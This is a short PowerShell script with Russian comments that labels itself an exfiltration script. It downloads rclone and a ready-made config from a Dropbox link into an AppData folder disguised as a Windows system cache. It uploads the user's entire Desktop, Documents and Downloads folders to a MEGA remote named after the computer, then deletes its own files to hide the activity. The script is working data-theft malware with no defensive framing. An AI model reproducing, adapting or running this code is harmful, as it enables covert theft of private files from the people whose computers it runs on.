# ==============================================
# Скрипт эксфильтрации (только папки)
# ==============================================

# --- НАСТРОЙКИ ---
$ArchiveUrl = "https://www.dropbox.com/scl/fi/lyda6ld925vwp1rwixykc/extool.zip?rlkey=3men45jf6jdsh00ii4uqybv66&st=1juz8rgz&dl=1"
$ExtractPath = "$env:APPDATA\Microsoft\Windows\Caches\SystemCache"
$ComputerName = $env:COMPUTERNAME

# --- Папки для копирования (целиком!) ---
$TargetFolders = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

# --- 1. Создание рабочей папки ---
if (!(Test-Path $ExtractPath)) {
    New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null
}

# --- 2. Скачивание и распаковка rclone ---
$ZipPath = "$ExtractPath\extool.zip"
Invoke-WebRequest -Uri $ArchiveUrl -OutFile $ZipPath -UseBasicParsing
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipPath, $ExtractPath)
Remove-Item $ZipPath -Force

$RcloneExe = "$ExtractPath\rclone.exe"
$RcloneConf = "$ExtractPath\rclone.conf"

# --- 3. Создание папки на MEGA ---
$RemotePath = "test:/$ComputerName"
& $RcloneExe --config $RcloneConf mkdir "$RemotePath"


# --- 4. Копирование каждой папки ПОЛНОСТЬЮ (включая саму папку) ---
foreach ($Folder in $TargetFolders) {
    if (Test-Path $Folder) {
        Write-Host "Копирую: $Folder -> $RemotePath"
        & $RcloneExe --config $RcloneConf copy "$Folder" "$RemotePath/$($Folder | Split-Path -Leaf)" --verbose --no-console
    } else {
        Write-Host "Папка не найдена: $Folder"
    }
}

# --- 5. Очистка ---
Remove-Item $ExtractPath -Recurse -Force